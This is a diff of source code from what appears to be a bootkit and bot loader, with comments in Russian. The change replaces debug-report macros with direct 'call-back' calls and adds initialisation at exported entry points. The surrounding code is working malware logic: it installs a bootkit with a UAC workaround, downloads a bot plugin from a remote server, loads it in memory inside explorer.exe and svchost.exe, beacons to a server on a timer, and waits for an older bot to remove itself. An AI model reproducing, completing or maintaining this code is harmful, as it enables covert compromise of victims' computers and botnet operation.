@@ -83,9 +83,9 @@ void DbgRptSvchostThread(void* Arguments)
 		LDRDBG("DbgRptSvchostThread", "Notify debug report...");
 
 		// 304_ld постоянная работа в Svchost (каждые 3 минуты)
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("304_ld"));
+		DebugReportStepByName("304_ld");
 
-		PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());
+		DebugReportUpdateNtldrCheckSum();
 
 		LDRDBG("DbgRptSvchostThread", "Sleeping 15 min after report...");
 		pSleep(15 * 60 * 1000);
@@ -108,7 +108,7 @@ void DbgRptExplorerThread(void* Arguments)
 		LDRDBG("DbgRptExplorerThread", "Notify debug report...");
 
 		// 305_ld постоянная работа в Explorer (каждые 3 минуты)
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("305_ld"));
+		DebugReportStepByName("305_ld");
 
 		LDRDBG("DbgRptExplorerThread", "Sleeping 15 min after report...");
 		pSleep(15 * 60 * 1000);
@@ -122,7 +122,7 @@ void DbgRptRebootNotifyThread(void* Arguments)
 		LDRDBG("DbgRptRebootNotifyThread", "Pinging server...");
 
 		//150_d таймер отсчета завершения ребута
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("150_d"));
+		DebugReportStepByName("150_d");
 
 		LDRDBG("DbgRptRebootNotifyThread", "Sleeping 10 min");
 		pSleep(10 * 60 * 1000);
@@ -242,7 +242,7 @@ namespace DLLLoader
 		LDRDBG("BRDS", "Инициализируем загрузку плагина!");
 
 		// 311_ld начало загрузки файла плага с сервера в svchost
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("311_ld"));
+		DebugReportStepByName("311_ld");
 
 
 		Module = Plugin::DownloadEx(BotPluginName, NULL, &Size, true, true, NULL);
@@ -250,7 +250,7 @@ namespace DLLLoader
 		LDRDBG("BRDS", "DownloadEx result module=0x%u", Module);
 
 		// 312_ld окончание загрузки файла плага с сервера в svchost
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("312_ld"));
+		DebugReportStepByName("312_ld");
 
 		if (Module != NULL)
 		{
@@ -265,7 +265,7 @@ namespace DLLLoader
 			LDRDBG("BRDS", "Уведомляем эксплорер ");
 
 			// 313_ld успешная загрузка файла плага с сервера в svchost
-			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("313_ld"));
+			DebugReportStepByName("313_ld");
 
 			WaitExplorer();
 
@@ -376,7 +376,7 @@ void SetParam(DWORD ID)
 void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 {
 	// 320_ld попытка загрузки и запуска BotPlug
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("320_ld"));
+	DebugReportStepByName("320_ld");
 
 
 	HMEMORYMODULE Module = MemoryLoadLibrary(Buf);
@@ -415,7 +415,7 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 		Method(NULL, NULL, NULL);
 
 		// 321_ld попытка загрузки и запуска BotPlug успешна
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("321_ld"));
+		DebugReportStepByName("321_ld");
 	}
 }
 
@@ -426,7 +426,7 @@ bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 	LDRDBG("BRDS Explorer", "DoStartBotDll() запущена");
 
 	// 310_ld попытка получить файл плага с кеша в Explorer
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("310_ld"));
+	DebugReportStepByName("310_ld");
 
 	if (IsNewProcess(DLLLoader::ExplorerPID))
 		DLLLoader::DLLLoadedInExplorer = false;
@@ -479,7 +479,7 @@ DWORD WINAPI ExplorerStartProc(LPVOID Data)
 	}
 
 	// 302_ld запуск в Explorer (тут сети может не быть)
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("302_ld"));
+	DebugReportStepByName("302_ld");
 
 	// Запускаем поток в svchost отзвона на тестовый сервер
 	StartThread(DbgRptExplorerThread, NULL);
@@ -601,6 +601,8 @@ void StartBootkitDll(void* Arguments)
 	pSleep(timeout);
 	LDRDBG("StartBootkitDll", "Waking up after %d ms.", timeout);
 
+	DebugReportInit();
+
 	// определяем в каком процессе находимся
 	char Name[MAX_PATH];
 	if ((DWORD)pGetModuleFileNameA(NULL, Name, MAX_PATH) == 0) return;
@@ -624,13 +626,13 @@ void StartBootkitDll(void* Arguments)
 	if (Hash == 0x2608DF01 /* svchost.exe */)
 	{
 		LDRDBG("StartBootkitDll", "LoaderDll loaded in SVCHOST. ");
-		PP_DBGRPT_FUNCTION_CALL(StartThread(DbgRptSvchostThread, NULL));
+		StartThread(DbgRptSvchostThread, NULL);
 	}
 	
 	if (Hash == 0x490A0972 /* explorer.exe */)
 	{
 		LDRDBG("StartBootkitDll", "LoaderDll loaded in EXPLORER. ");
-		PP_DBGRPT_FUNCTION_CALL(StartThread(DbgRptExplorerThread, NULL));
+		StartThread(DbgRptExplorerThread, NULL);
 		
 		LDRDBG("StartBootkitDll", "Starting loading and run plug.");
 		StartThread(ExplorerLoadAndRunBotPlug, NULL);
@@ -678,7 +680,7 @@ void WaitForOldRing3BotSelfRemoved()
 			PeriodInSec);
 
 		// 318_ld ожидание удаления прежнего ring3 бота перед перезагрузкой
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("318_ld"));
+		DebugReportStepByName("318_ld");
 
 		pSleep(PeriodInSec * 1000);
 		PeriodCount--;
@@ -700,7 +702,11 @@ void WaitForOldRing3BotSelfRemoved()
 
 BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 {
+	// Инициализируемся в точке входа в длл: 
+	// - сбрасываем флаг загрузчика буткита
+	// - инициализируем вызов отладочных ф-ций
 	ResetBootkitLoaderFlag();
+	DebugReportInit();
 
 	DWORD Size = 0;
 	LPVOID Module = NULL;
@@ -709,7 +715,7 @@ BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 	LDRDBG("LoadPlugToCache", "Делаем отзвон о начале загрузки.");
 
 	// 315_ld начало загрузки файла плага методом LoadPlugToCache
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));
+	DebugReportStepByName("315_ld");
 
 	//Загружаем библиотеку
 	LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");
@@ -719,7 +725,7 @@ BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 	LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);
 
 	// 316_ld окончание загрузки файла плага методом LoadPlugToCache
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("316_ld"));
+	DebugReportStepByName("316_ld");
 
 	if (Module != NULL)
 	{
@@ -727,7 +733,7 @@ BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 		LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
 		
 		// 317_ld успешная загрузка файла плага методом LoadPlugToCache
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
+		DebugReportStepByName("317_ld");
 		MemFree(Module);
 
 		if (WaitForBotRemove == TRUE) WaitForOldRing3BotSelfRemoved();
@@ -740,7 +746,11 @@ BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 
 BOOL WINAPI BkDropWithPossibleUac(const void* SelfBody, DWORD SelfBodySize)
 {
+	// Инициализируемся в точке входа в длл: 
+	// - сбрасываем флаг загрузчика буткита
+	// - инициализируем вызов отладочных ф-ций
 	ResetBootkitLoaderFlag();
+	DebugReportInit();
 
 	// Устанавливаем буткит часть с учетов возможного UAC
 	bool InstallResult = BkDeployAndInstallWithPossibleUac(SelfBody, SelfBodySize);
@@ -755,7 +765,11 @@ BOOL WINAPI BkDropWithPossibleUac(const void* SelfBody, DWORD SelfBodySize)
 
 BOOL WINAPI BkDrop()
 {
+	// Инициализируемся в точке входа в длл: 
+	// - сбрасываем флаг загрузчика буткита
+	// - инициализируем вызов отладочных ф-ций
 	ResetBootkitLoaderFlag();
+	DebugReportInit();
 
 	// Устанавливаем буткит часть
 	// Если получается установить - скачиваем ботплаг.
@@ -765,7 +779,7 @@ BOOL WINAPI BkDrop()
 	if (InstallResult == false) return FALSE;
 
 	LDRDBG("BkDrop", "Bk installed successfuly. Starting reboot ping thread...");
-	PP_DBGRPT_FUNCTION_CALL(StartThread(DbgRptRebootNotifyThread, NULL));
+	StartThread(DbgRptRebootNotifyThread, NULL);
 
 	// Закачиваем ботплаг и не ждем, потому что по идее бот сам нас ждет.
 	return LoadPlugToCache(FALSE, 0);
@@ -773,7 +787,11 @@ BOOL WINAPI BkDrop()
 
 void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
 {
+	// Инициализируемся в точке входа в длл: 
+	// - сбрасываем флаг загрузчика буткита
+	// - инициализируем вызов отладочных ф-ций
 	ResetBootkitLoaderFlag();
+	DebugReportInit();
 
 	LDRDBG("LoadPlugFromRawFile", "started with '%S' param", path);
 	
